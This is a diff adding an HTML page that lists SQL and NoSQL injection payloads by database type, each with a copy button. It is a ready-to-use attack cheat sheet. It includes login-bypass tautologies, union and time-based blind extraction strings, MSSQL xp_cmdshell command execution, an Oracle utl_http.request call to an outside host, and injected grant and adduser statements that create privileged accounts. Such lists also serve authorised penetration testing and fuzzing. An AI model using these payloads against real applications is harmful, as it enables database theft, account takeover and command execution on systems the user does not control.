@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Hacker Themed SQL Injection Payloads</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #0f0;
+      font-family: "Courier New", Courier, monospace;
+      padding: 20px;
+    }
+    h1, h2 {
+      text-align: center;
+      color: #0f0;
+    }
+    .section {
+      margin-bottom: 40px;
+      border: 1px solid #0f0;
+      padding: 15px;
+      border-radius: 5px;
+    }
+    .payload {
+      background-color: #111;
+      padding: 10px;
+      margin: 5px 0;
+      border-radius: 3px;
+      position: relative;
+      transition: background 0.3s ease;
+      cursor: pointer;
+    }
+    .payload:hover {
+      background-color: #222;
+    }
+    .payload span {
+      display: block;
+      word-break: break-all;
+    }
+    .copy-btn {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      background-color: #0f0;
+      color: #000;
+      border: none;
+      padding: 5px 8px;
+      border-radius: 3px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    .copy-btn:hover {
+      background-color: #0c0;
+    }
+  </style>
+</head>
+<body>
+  <h1>SQL Injection Payloads</h1>
+  <div id="payload-container"></div>
+  
+  <script>
+    // Define the payloads in an object; add the rest of your payloads as needed.
+    const payloads = {
+      "MySQL": [
+        "1'1",
+        "1 exec sp_ (or exec xp_)",
+        "1 and 1=1",
+        "1' and 1=(select count(*) from tablenames); --",
+        "1 or 1=1",
+        "1' or '1'='1",
+        "1or1=1",
+        "1'or'1'='1",
+        "fake@ema'or'il.nl'='il.nl"
+      ],
+      "MYSQL-MSSQL": [
+        "1 and user_name() = 'dbo'",
+        "\\'; desc users; --",
+        "1\\'1",
+        "1' and non_existant_table = '1",
+        "' or username is not NULL or username = '",
+        "1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116",
+        "1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --",
+        "1 uni/**/on select all from where"
+      ],
+      "MSSQL": [
+        "; --",
+        "'; --",
+        "'); --",
+        "'; exec master..xp_cmdshell 'ping 10.10.1.2'--",
+        "' grant connect to name; grant resource to name; --",
+        "' or 1=1 --",
+        "' union (select @@version) --",
+        "' union (select NULL, (select @@version)) --"
+        // … add remaining payloads here
+      ],
+      "Blind_MSSQL": [
+        "'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --",
+        "'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --"
+        // … add more as needed
+      ],
+      "NOSQL": [
+        "true, $where: '1 == 1'",
+        "$where: '1 == 1'",
+        "{ $ne: 1 }",
+        "db.injection.insert({success:1});"
+        // … add more as needed
+      ],
+      "ORACLE": [
+        "’ or ‘1’=’1",
+        "' or '1'='1",
+        "||utl_http.request('httP://192.168.1.1/')||'",
+        "' || myappadmin.adduser('admin', 'newpass') || '"
+        // … add more as needed
+      ],
+      "xplatform": [
+        "<>\"'%;)(&+",
+        "|",
+        "!",
+        "?"
+        // … add more as needed
+      ],
+      "Generic_SQLi": [
+        ")%20or%20('x'='x",
+        "%20or%201=1",
+        "; execute immediate 'sel' || 'ect us' || 'er'",
+        "benchmark(10000000,MD5(1))#"
+        // … add more as needed
+      ],
+      "GenericBlind": [
+        "sleep(__TIME__)#",
+        "1 or sleep(__TIME__)#",
+        "\" or sleep(__TIME__)#",
+        "' or sleep(__TIME__)#"
+        // … add more as needed
+      ],
+      "Generic Error Based": [
+        "OR 1=1",
+        "OR 1=0",
+        "OR x=x",
+        "OR x=y",
+        "HAVING 1=1",
+        "HAVING 1=0"
+        // … add more as needed
+      ],
+      "Generic_TimeBased": [
+        "sleep(5)#",
+        "1 or sleep(5)#",
+        "\" or sleep(5)#",
+        "' or sleep(5)#",
+        ";waitfor delay '0:0:5'--"
+        // … add more as needed
+      ],
+      "Generic_UnionBased": [
+        "ORDER BY SLEEP(5)",
+        "UNION ALL SELECT 1",
+        "UNION ALL SELECT 1,2,3,4"
+        // … add more as needed
+      ]
+    };
+
+    // Render the payload sections on page load.
+    window.onload = function() {
+      const container = document.getElementById('payload-container');
+      for (let category in payloads) {
+        // Create section container.
+        let sectionDiv = document.createElement('div');
+        sectionDiv.className = 'section';
+        
+        // Add category header.
+        let header = document.createElement('h2');
+        header.textContent = category;
+        sectionDiv.appendChild(header);
+        
+        // Add each payload.
+        payloads[category].forEach(payload => {
+          let payloadDiv = document.createElement('div');
+          payloadDiv.className = 'payload';
+          
+          let payloadText = document.createElement('span');
+          payloadText.textContent = payload;
+          payloadDiv.appendChild(payloadText);
+          
+          let copyBtn = document.createElement('button');
+          copyBtn.className = 'copy-btn';
+          copyBtn.textContent = 'Copy';
+          copyBtn.onclick = function() {
+            copyText(payload, copyBtn);
+          };
+          payloadDiv.appendChild(copyBtn);
+          
+          sectionDiv.appendChild(payloadDiv);
+        });
+        
+        container.appendChild(sectionDiv);
+      }
+    };
+
+    // Copy text to clipboard and temporarily change button text.
+    function copyText(text, btn) {
+      navigator.clipboard.writeText(text).then(function() {
+        btn.textContent = "Copied!";
+        setTimeout(() => btn.textContent = "Copy", 1500);
+      }).catch(function(err) {
+        console.error('Error copying text: ', err);
+      });
+    }
+  </script>
+</body>
+</html>
